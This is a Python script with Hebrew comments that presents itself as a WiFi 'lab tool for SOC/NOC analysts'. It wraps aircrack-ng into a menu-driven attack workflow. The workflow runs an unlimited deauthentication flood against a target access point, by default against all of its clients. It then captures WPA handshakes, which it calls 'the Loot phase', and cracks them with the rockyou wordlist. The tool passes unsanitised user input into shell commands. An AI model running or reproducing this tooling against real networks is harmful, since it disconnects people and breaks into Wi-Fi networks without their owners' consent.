#!/usr/bin/env python3
import subprocess
import os
import signal
import time

# הגדרת צבעים לטרמינל
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""{Colors.CYAN}{Colors.BOLD}
    ███████╗ █████╗  ██████╗ █████╗ ██╗███╗   ███╗
    ╚══███╔╝██╔══██╗██╔════╝██╔══██╗██║████╗ ████║
      ███╔╝ ███████║██║     ███████║██║██╔████╔██║
     ███╔╝  ██╔══██║██║     ██╔══██║██║██║╚██╔╝██║
    ███████╗██║  ██║╚██████╗██║  ██║██║██║ ╚═╝ ██║
    ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝
    {Colors.YELLOW}>> Advanced WiFi Lab Tool for SOC/NOC Analysts <<{Colors.RESET}
    """)

def get_interfaces():
    """מזהה אוטומטית כרטיסי רשת אלחוטיים"""
    res = subprocess.check_output("iw dev | grep Interface | cut -d' ' -f2", shell=True)
    return res.decode().split()

def kill_conflicting_processes():
    print(f"{Colors.YELLOW}[*] Killing conflicting processes (NetworkManager, etc...){Colors.RESET}")
    subprocess.run("sudo airmon-ng check kill", shell=True)

def start_monitor(iface):
    print(f"{Colors.GREEN}[+] Enabling Monitor Mode on {iface}...{Colors.RESET}")
    subprocess.run(f"sudo airmon-ng start {iface}", shell=True)
    return iface + "mon"

def attack_deauth():
    bssid = input(f"{Colors.BOLD}Target BSSID (MAC): {Colors.RESET}")
    client = input(f"{Colors.BOLD}Target Client MAC (or skip for ALL): {Colors.RESET}") or "FF:FF:FF:FF:FF:FF"
    iface = "wlan0mon"
    
    print(f"{Colors.RED}[!!!] ATTACKING {bssid} -> {client} [Ctrl+C to Stop]{Colors.RESET}")
    try:
        # הפעלת המתקפה בחלון חדש (Xterm) אם קיים, או באותו חלון
        cmd = f"sudo aireplay-ng --deauth 0 -a {bssid} -c {client} {iface}"
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Attack Stopped.{Colors.RESET}")

def main_menu():
    os.system('clear')
    banner()
    print(f"{Colors.BOLD}1.{Colors.RESET} Setup Environment (Kill processes & Monitor Mode)")
    print(f"{Colors.BOLD}2.{Colors.RESET} Live Network Scanner (Find Targets)")
    print(f"{Colors.BOLD}3.{Colors.RESET} Deauth / Disconnect Attack")
    print(f"{Colors.BOLD}4.{Colors.RESET} Handshake Capture (The 'Loot' Phase)")
    print(f"{Colors.BOLD}5.{Colors.RESET} Crack Password (RockYou)")
    print(f"{Colors.BOLD}6.{Colors.RESET} Reset Network & Exit")
    print("-" * 45)
    return input(f"{Colors.GREEN}Zacaim@{Colors.CYAN}Kali{Colors.RESET}:~# ")

def main():
    if os.geteuid() != 0:
        print(f"{Colors.RED}[!] Error: Run as ROOT (sudo python3 ...){Colors.RESET}")
        return

    while True:
        choice = main_menu()
        
        if choice == '1':
            kill_conflicting_processes()
            ifaces = get_interfaces()
            if ifaces:
                start_monitor(ifaces[0])
            input("\nDone. Press Enter...")
            
        elif choice == '2':
            print(f"{Colors.CYAN}[*] Opening Airodump... Close window or Ctrl+C to return.{Colors.RESET}")
            subprocess.run("sudo airodump-ng wlan0mon", shell=True)
            
        elif choice == '3':
            attack_deauth()
            
        elif choice == '4':
            bssid = input("Target BSSID: ")
            ch = input("Channel: ")
            out = input("Output Filename: ")
            print(f"{Colors.YELLOW}[*] Capturing... Use another terminal for Deauth to force Handshake!{Colors.RESET}")
            subprocess.run(f"sudo airodump-ng -c {ch} --bssid {bssid} -w {out} wlan0mon", shell=True)
            
        elif choice == '5':
            cap = input("Path to .cap file: ")
            subprocess.run(f"sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt {cap}*.cap", shell=True)
            input("\nPress Enter...")

        elif choice == '6':
            print(f"{Colors.YELLOW}[*] Restoring Network...{Colors.RESET}")
            subprocess.run("sudo airmon-ng stop wlan0mon && sudo systemctl start NetworkManager", shell=True)
            break

if __name__ == "__main__":
    main()
